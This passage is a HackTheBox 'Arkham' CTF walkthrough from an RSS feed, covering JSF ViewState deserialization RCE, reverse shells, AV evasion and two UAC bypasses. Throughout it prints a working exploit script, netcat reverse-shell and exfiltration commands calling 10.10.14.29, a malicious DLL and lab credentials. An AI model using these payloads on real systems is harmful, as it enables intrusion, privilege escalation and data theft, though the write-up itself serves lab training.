+    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
+    // initialize the cipher for decryption with the secret key
+    cipher.init(Cipher.DECRYPT_MODE, "SnNGOTg3Ni0=");
+    // SHA1 output = 20 bytes
+    int macLenght = mac.getMacLength();
+    // calculate the mac from the received data
+    mac.update(secure, 0, secure.length-macLenght);
+    byte[] signedDigestHash = mac.doFinal();
+    boolean isMacEqual = true;
+    // check if the received mac has been calculated with the correct key
+    for (int i = 0; i &lt; signedDigestHash.length; i++)
+    {
+        if (signedDigestHash[i] != secure[secure.length-macLenght+i])
+        {
+            isMacEqual = false;
+        }
+    }
+    // if the two macs are equal the object is decrypted
+    return cipher.doFinal(secure, 0, secure.length-macLenght);
+}
+</code></pre>
+<p>The way it works is the serialized Java object is made of DES encrypted data with the HMAC used for verification appended at the end, it being the last 20 bytes. This structure is then encoded in Base64 and it’s what we saw earlier on Burp. The HMAC is used to calculate a message digest using the encrypted data and the secret key, when the server receives the ViewState object back it will first calculate a new HMAC from the data it received and the key stored in the settings, if it’s the same as the HMAC appended to the data then the data can be trusted and it is finally deserialized. Now that we have that secret key we can use it to calculate our own valid HMACs, allowing us to achieve RCE because our objects will look 100% legit.</p>
+<hr>
+<p><a name="exploitation" href="https://0x00sec.org"></a><br>
+<strong>Exploitation: blind shell</strong></p>
+<p>By exploiting this flaw we’ll be able to execute arbitrary Java gadgets that when chained together can perform several tasks, but because we’re not executing OS commands from the start we need a third party program to generate these chains for us and serialize them, for this purpose I downloaded <a href="https://github.com/frohoff/ysoserial" rel="noopener nofollow ugc">ysoserial</a> and used the CommonsCollections5 gadgets to execute cmd.exe on the system. ysoserial returns the serialized object on stdout so we can write a Python script that grabs the output from ysoserial and forwards it to the server after encrypting it properly and appending the correct HMAC to it:</p>
+<pre><code class="lang-auto">import base64
+import hashlib
+import urllib
+import hmac
+import pyDes
+import sys
+import requests
+import subprocess
+
+# generate the serialized Java object
+def getPayload(cmd):
+    p = subprocess.Popen('java -jar /home/baud/arkham/ysoserial.jar CommonsCollections5 "'+cmd+'"', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    payload = p.stdout.read()
+
+    # encrypt the object with DES
+    secret = bytes(base64.b64decode("SnNGOTg3Ni0="))
+    des_obj = pyDes.des(secret, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
+    encrypted_payload = des_obj.encrypt(payload)
+
+    # calculate the HMAC
+    mac_obj = hmac.new(secret, encrypted_payload, hashlib.sha1)
+    mac = mac_obj.digest()
+
+    # return [encrypted_data + HMAC]
+    out = base64.encodestring(encrypted_payload + mac)
+    out = out.replace('\n', '').replace('\r', '')
+    return out
+
+# ask for the command to be executed
+while True:
+    cmd = raw_input("&gt; ")
+    if cmd == 'exit':
+        sys.exit(0)
+
+    # send a POST request to the server with our newly crafted ViewState object
+    url = "http://10.10.10.130:8080/userSubscribe.faces"
+    cookies = {"JSESSIONID": "38D5C0F7EAC7A6F06299275C268986BB"}
+    req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
+    req_data={"j_id_jsp_1623871077_1:email": "baudy@baud.com", "j_id_jsp_1623871077_1:submit": "SIGN UP", "j_id_jsp_1623871077_1_SUBMIT": "1"}
+    data['javax.faces.ViewState'] = getPayload(cmd)
+    r = requests.post(url, cookies=cookies, data=req_data, headers=req_headers)
+</code></pre>
+<p>This script gives us a blind shell on the box, we are able to execute any operation we want but it’s still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebReques after starting an HTTP server with PHP and opening a listener to welcome the incoming connection:</p>
+<pre><code>┌─[root@parrot]─[/home/baud/server]
+└──╼ # php -S 0.0.0.0:9090 -t .
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # nc -lvnp 9999
+</code></pre>
+<p>And from the blind shell :</p>
+<pre><code>&gt; powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
+&gt; nc.exe -e cmd 10.10.14.29 9999
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d5e210a24a1b0a0b679a9f3b8ab154429019358e.png" alt="image" data-base62-sha1="uw62FZSOW8goyVlArTHIx3f3YwC" width="690" height="360"><br>
+With this we finally have a shell as Alfred and can read our first flag, then it’s time for some local enumeration. Aside from Alfred and Administrator there’s another user on the system: Batman. Unfortunately his directory is out of our reach.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fa917547edcfb0060934724df94567e03b7eefe6.png" alt="image" data-base62-sha1="zKD0DgK4EX18YrgOYDJqqjGEkxo" width="503" height="254"><br>
+<strong>Horizontal privilege escalation</strong></p>
+<p>Inside Alfred’s downloads directory there’s a backups folder containing a backup.zip file, because I’m lazy and meterpreter executables are immediately detected by an angry Defender I’m going to use nc.exe to transfer this file locally:</p>
+<pre><code># On Arkham:
+nc.exe 10.10.14.29 4444 &lt; c:\users\alfred\downloads\backups\backup.zip
+# On local box:
+nc -lvp 4444 &gt; backup.zip
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d69a7cd9b6e315cfa5b93fc8d176fa584395f03.png" alt="image" data-base62-sha1="dkmLM5PgNc3s7BgeCVg1oC5J5u3" width="578" height="405"><br>
+After unzipping the file it turns out the content is a .ost file, so an Outlook mail archive, so to say. On Linux we can open it using readpst and it will extract the emails it finds:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ea8d42602ed5a619c1de9d990939af119cd62b46.png" alt="image" data-base62-sha1="xsWnekMqKfJoZZ2LcjbASBLE1b8" width="615" height="391"><br>
+The only email it found was in the Drafts folder and we can read it by catting the Drafts file created by readpst. The mail contains an image as attachment which is encoded in Base64 and the body of the message tells us this email was supposed to be sent to Master Wayne because he keeps forgetting his password:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/39d765447b9141596614b49516b6ba0e49285db6.png" alt="image" data-base62-sha1="8fGHjPZjSG60pZRYxR2TtQlFF7o" width="690" height="312"><br>
+Convert the attachment back to .png and the result is this:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e09c74002b4943b302daf945645e4a649fb4fb1d.png" alt="image" data-base62-sha1="w309sPgVlWE88C5R0GAXrZWOmJL" width="656" height="330"><br>
+Not only this picture gives us the Batman account’s password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:</p>
+<pre><code>User: batman
+Pass: Zx^#QZX+T!123
+</code></pre>
+<p>There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a <a href="https://www.sconstantinou.com/windows-powershell-sessions-pssessions/" rel="noopener nofollow ugc">PSSession</a>:</p>
+<pre><code class="lang-auto">$pw = ConvertTo-SecureString -string "Zx^#QZX+T!123" -AsPlainText -force;
+$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "ARKHAM\batman", $pw;
+Enter-PSSession -ComputerName localhost -Credential $pp
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f10d7d2f4f7c874e4bf0b17667a4fb69fbfadf47.png" alt="image" data-base62-sha1="yorYalDBP4o67N3ReAKx6ChS0M7" width="690" height="188"><br>
+Once in the PSSession we must follow the following syntax in order to run cmd commands:</p>
+<pre><code>Invoke-Command -ScriptBlock { command }
+</code></pre>
+<p>This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:</p>
+<pre><code>Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9bcddc8b4845beb0626a3218dffbfc8da49455ce.png" alt="image" data-base62-sha1="mej3YAHktXIVii1IjzCRLYyDBYa" width="588" height="199"><br>
+Now we can start investigating the system further. Batman’s home folder doesn’t contain anything so what’s the purpose in using this account? Well, apparently Batman is actually part of the Administrators group:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5470d5ad5382536a306a4c223e0bc4a34b5ca773.png" alt="image" data-base62-sha1="c2ZQZs136Qj0on0itWrcoqrQgdZ" width="690" height="284"><br>
+But trying to access the Administrator folder still results in an access denied error:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/74b2b79aae28b4bd6bef47639578572680467e5b.png" alt="image" data-base62-sha1="gEmhKYSMACdoKoF3cmgMKmubvn5" width="414" height="88"><br>
+This is because UAC is enabled and doesn’t allow us to use Administrator privileges, we’d need to be in an interactive desktop and click “Yes” on the UAC prompt in order to execute commands that require Administrator permissions.</p>
+<hr>
+<p><strong>Getting root - the easy way (net use)</strong></p>
+<p>I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred’s screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator’s folder (or the whole drive) on to another drive and we’ll be able to access it without UAC getting in the way:</p>
+<pre><code>$ net use * "\\arkham\users\administrator\desktop" /persistent:no
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ad0d25d386b088ebe3c5a0936e1b0f8e32dfaf2.png" alt="image" data-base62-sha1="feW0DRLVvZJv6Ad0zkcIdhomNCa" width="690" height="274"></p>
+<hr>
+<p><strong>Getting root - the real men’s way (UAC bypass)</strong></p>
+<p>There are a few currently unpathced UAC bypasses for Windows 10, I tried these two:</p>
+<ol>
+<li><a href="https://egre55.github.io/system-properties-uac-bypass/" rel="noopener nofollow ugc">https://egre55.github.io/system-properties-uac-bypass/</a></li>
+<li><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</a></li>
+</ol>
+<p>And I’m going to demonstrate egre55’s method because in my opinion it’s more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable’s manifest: “<em>autoElevate</em>”. If set to “true” this allows certain programs to be granted a token of higher integrity without going through the UAC prompt, while other processes stay with a medium integrity security token preventing them from performing any operations where administrator privileges are required. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:</p>
+<pre><code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
+C:\Windows\SysWOW64\SystemPropertiesHardware.exe
+C:\Windows\SysWOW64\SystemPropertiesProtection.exe
+C:\Windows\SysWOW64\SystemPropertiesRemote.exe
+</code></pre>
+<p>They all try to load a library called srrstr.dll from AppData/Local/Microsoft/WindowsApps/, folder which is present in the PATH environment variable and can be written to by normal users:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/21961a02cf14b385f842fd62db461c520d07d5a1.png" alt="image" data-base62-sha1="4N7lyG4aZD175rKEH69peYT6RgJ" width="690" height="76"><br>
+If we drop a malicious srrstr.dll file in that folder and start one of those programs our code will be executed with elevated privileges. Before we do that we must make sure our shell is in an interactive process, otherwise it won’t work. To do this we need a Meterpreter shell but because Defender will find and delete all default Meterpreter payloads there’s also a bit of AV evasion involved that I’ll solve with <a href="https://github.com/GreatSCT/GreatSCT" rel="noopener nofollow ugc">GreatSCT</a>. To be more specific I’ll be launching Meterpreter via the msbuild method, read more about it <a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" rel="noopener nofollow ugc">here</a>. Other useful AV evasion solutions that could work in this instance are <a href="https://github.com/Veil-Framework/Veil" rel="noopener nofollow ugc">Veil</a>, <a href="https://github.com/oddcod3/Phantom-Evasion" rel="noopener nofollow ugc">Phantom Evasion</a>, <a href="https://github.com/Genetic-Malware/Ebowla" rel="noopener nofollow ugc">Ebowla</a> and <a href="https://github.com/trustedsec/nps_payload" rel="noopener nofollow ugc">nps_payload</a>.</p>
+<p>These are the steps to generate the payload using GreatSCT:</p>
+<pre><code>&gt; use Bypass
+&gt; use msbuild/meterpreter/rev_tcp.py
+&gt; set LHOST 10.10.14.29
+&gt; set LPORT 9292
+&gt; generate
+</code></pre>
+<p>GreatSCT will create two different files for us:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1bc1b1e582d78f5da816f4b3640b35270787915b.png" alt="image" data-base62-sha1="3XxSD3MatZyKMC4vIVtVR1Igr8v" width="582" height="206"><br>
+payload.xml will be msbuild’s input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let’s download the xml file on Arkham (again with Invoke-WebRequest or “iwk” for short) and then launch msbuild.exe by specifing its absolute path since it’s not in %path%:</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
+</code></pre>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8019f8ebe63b2880742dad295ea6fd88f937b03c.png" alt="image" data-base62-sha1="iheLe38FCYJdFpZo6lUsw18prOs" width="690" height="122"><br>
+The handler in the meantime catches the incoming connection and starts a Meterpreter session:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e4302307efa79b83a2c63e7bd0b8775e7888f7b1.png" alt="image" data-base62-sha1="wyDZKuBU7Q1z1LKWE0FioBLxxol" width="690" height="285"><br>
+Now we can list running processes with ps and select an interactive one (so one with a GUI) to migrate to, explorer.exe is a good example:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/20c649103ba7a8f549080375dcaa04638b40541f.png" alt="image" data-base62-sha1="4FW6q8mgfDW8d8Zif2YOUFIWuIL" width="690" height="120"><br>
+Now it’s time to craft a DLL. Mine will just start a reverse shell with the same nc.exe we’ve been using over and over again, here’s the C++ code:</p>
+<pre><code class="lang-auto">#include &lt;windows.h&gt;
+
+void exploit(void);
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{
+    switch (dwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            exploit();
+    }
+    return TRUE;
+}
+
+void exploit(void)
+{
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&amp;pi, sizeof(pi));
+    char cmd[] = "C:\\tomcat\\apache-tomcat-8.5.37\\bin\\nc.exe -e cmd 10.10.14.29 5555";
+    
+    CreateProcess(NULL, // No module name (use command line)
+        cmd,            // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        0,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory
+        &amp;si,            // Pointer to STARTUPINFO structure
+        &amp;pi );          // Pointer to PROCESS_INFORMATION structure
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    ExitThread(0);
+}
+</code></pre>
+<p>If you’re interested in knowing more about how it works I suggest reading these two pages: <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain" rel="noopener nofollow ugc">DllMain</a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="noopener nofollow ugc">CreateProcessA</a>. I compiled it using mingw32:</p>
+<pre><code>┌─[baud@parrot]─[~/arkham]
+└──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
+</code></pre>
+<p>Note: if anyone knows why only the code compiled with i686-w64-mingw32-gcc works on the box and not with x86_64-w64-mingw32-gcc please let me know, because I’m a little confused.  Anyway, drop the DLL in the WindowsApps folder, launch one of the vulnerable programs, and a shell is spawned:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/347c9c4d2a7e9ec4bfc1a6ad65bfea72262d525e.png" alt="image" data-base62-sha1="7ujNVJeWDclbKkmCeFqWHlzEIUe" width="690" height="215"><br>
+<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4354d6d08a34686b54777aae82f8dcb187666877.png" alt="image" data-base62-sha1="9BDKXOnnfgs9FSM8oLUAVJ2VwFh" width="550" height="264"><br>
+Note that the full path of the program must be specified, this is necessary because there are two different copies of the program on the disk, one in System32 and the other in SysWOW64, apparently the attack only works with the second executable.</p>
+<p>The second UAC bypass is easy to pull off as well, it consinsts in downloading a <a href="https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs" rel="noopener nofollow ugc">C# source file</a>, compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. <a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/" rel="noopener nofollow ugc">Here</a> is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:</p>
+<pre><code class="lang-auto"># download the file locally:
+Invoke-WebRequest "http://10.10.14.29:9090/bypass.cs" -outfile "./Source.cs"
+# compile it as a DLL:
+Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
+# load the newly compiled DLL into memory:
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
+# get a reverse shell using nc:
+[CMSTPBypass]::Execute("C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9898 -e cmd.exe")
+</code></pre>
+<p><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">(source)</a></p>
+<p>This was Arkham, one of the most fun and instructive boxes I’ve done so far. Thank you for reading, I hope you found this post useful.</p>
+          <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541/1</link>
+        <pubDate>Sat, 10 Aug 2019 15:08:52 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15541-1</guid>
+        <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
+      </item>
+  </channel>
+</rss>
